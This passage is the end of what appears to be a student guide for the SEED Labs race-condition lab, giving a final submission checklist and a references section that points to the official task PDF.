* [ ] Actual measurements replace all results placeholders.
* [ ] Race cause, attacker gain and all four division countermeasure themes are covered.
* [ ] Source attribution included; final modified source/helpers attached.
* [ ] Slides and a short demo rehearsed with saved real-run evidence ready.
* [ ] Evidence/logs copied out of the VM; lab cleaned up.
* [ ] Group's final submission format and deadline confirmed.

## 18. References

Use the linked sources and attribution in `README.md`. The lecturer-linked [official task PDF](https://seedsecuritylabs.org/Labs_20.04/Files/Race_Condition/Race_Condition.pdf) takes precedence if your lecturer supplies a changed version. This guide follows its Ubuntu 20.04 tasks, with separate named binaries, basic error checking, bounded monitoring and explicit evidence/reset steps added for reproducibility.
